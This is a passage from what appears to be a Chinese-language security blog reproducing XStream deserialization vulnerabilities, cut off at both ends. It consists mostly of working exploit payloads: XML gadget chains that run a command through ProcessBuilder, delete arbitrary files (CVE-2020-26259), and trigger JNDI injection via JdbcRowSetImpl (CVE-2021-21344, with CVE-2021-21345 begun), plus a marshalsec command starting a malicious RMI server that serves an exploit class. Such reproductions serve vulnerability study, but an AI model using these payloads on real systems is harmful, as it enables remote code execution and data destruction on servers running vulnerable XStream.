class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">contentType</span>&gt;</span>text/plain<span class="hljs-tag">&lt;/<span class="hljs-name">contentType</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">e</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">iterator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">cursor</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">cursor</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">lastRet</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">lastRet</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">expectedModCount</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">expectedModCount</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">java.lang.ProcessBuilder</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">java.lang.ProcessBuilder</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">outer-class</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">iter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">method</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">method</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">next</span>/&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">iterator</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>KEYS<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">in</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">buf</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">buf</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">pos</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">pos</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">mark</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">mark</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">count</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">count</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">in</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">consumed</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106145534172.png" alt="image-20241106145534172"></p><h2 id="cve-2020-26259任意文件删除漏洞"><a href="#CVE-2020-26259任意文件删除漏洞" class="headerlink" title="CVE-2020-26259任意文件删除漏洞"></a>CVE-2020-26259任意文件删除漏洞</h2><p>影响版本&lt;1.4.14</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">contentType</span>&gt;</span>text/plain<span class="hljs-tag">&lt;/<span class="hljs-name">contentType</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.util.ReadAllStream$FileStream&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">tempFile</span>&gt;</span>test.txt<span class="hljs-tag">&lt;/<span class="hljs-name">tempFile</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br></code></pre></td></tr></table></figure><p>创建一个txt在项目根目录</p><p><img src="https://cdn.clown2024.cn/image-20241106145406896.png" alt="image-20241106145406896"></p><p>然后成功删除</p><h2 id="cve-2021-21344远程代码执行漏洞"><a href="#CVE-2021-21344远程代码执行漏洞" class="headerlink" title="CVE-2021-21344远程代码执行漏洞"></a>CVE-2021-21344远程代码执行漏洞</h2><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">unserializable-parents</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">size</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">size</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">comparator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">indexMap</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">packet</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">message</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">bi</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">jaxbType</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">uriProperties</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">attributeProperties</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">inheritedAttWildcard</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">getter</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>getDatabaseMetaData<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">getter</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">inheritedAttWildcard</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">bi</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">tagName</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">context</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">marshallerPool</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&#x27;../..&#x27;</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">marshallerPool</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">nameList</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">localNames</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">localNames</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">nameList</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">jaxbObject</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">javax.sql.rowset.BaseRowSet</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">concurrency</span>&gt;</span>1008<span class="hljs-tag">&lt;/<span class="hljs-name">concurrency</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">escapeProcessing</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">escapeProcessing</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">fetchDir</span>&gt;</span>1000<span class="hljs-tag">&lt;/<span class="hljs-name">fetchDir</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">fetchSize</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">fetchSize</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">isolation</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">isolation</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">maxFieldSize</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">maxFieldSize</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">maxRows</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">maxRows</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">queryTimeout</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">queryTimeout</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">readOnly</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">readOnly</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">rowSetType</span>&gt;</span>1004<span class="hljs-tag">&lt;/<span class="hljs-name">rowSetType</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">showDeleted</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">showDeleted</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span>&gt;</span>rmi://127.0.0.1:1099/exp<span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">params</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">javax.sql.rowset.BaseRowSet</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">iMatchColumns</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">iMatchColumns</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">strMatchColumns</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">strMatchColumns</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">jaxbObject</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">satellites</span>/&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">invocationProperties</span>/&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">packet</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">indexMap</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">comparator</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里打的是jndi注入</p><p>那我们就需要起一个恶意的rmi服务，这里用marshalsec来起服务</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8888</span>/#exp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106152810804.png" alt="image-20241106152810804"></p><p>web服务下有一个计算器的exp.class</p><p><img src="https://cdn.clown2024.cn/image-20241106153040392.png" alt="image-20241106153040392"></p><h2 id="cve-2021-21345远程代码执行漏洞"><a href="#CVE-2021-21345远程代码执行漏洞" class="headerlink" title="CVE-2021-21345远程代码执行漏洞"></a>CVE-2021-21345远程代码执行漏洞</h2><p>影响版本&lt;&#x3D;1.4.15</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">unserializable-parents</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">size</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">size</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">comparator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">indexMap</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">packet</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">message</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">bi</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="hljs-tag">&lt;/<span class="hljs-name">jaxbType</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">uriProperties</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">attributeProperties</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">inheritedAttWildcard</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">getter</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>verify<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">getter</span>&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">inheritedAttWildcard</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">bi</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">tagName</span>/&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">context</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">marshallerPool</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&#x27;../..&#x27;</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">marshallerPool</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">nameList</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">localNames</span>&gt;</span><br>                          <span 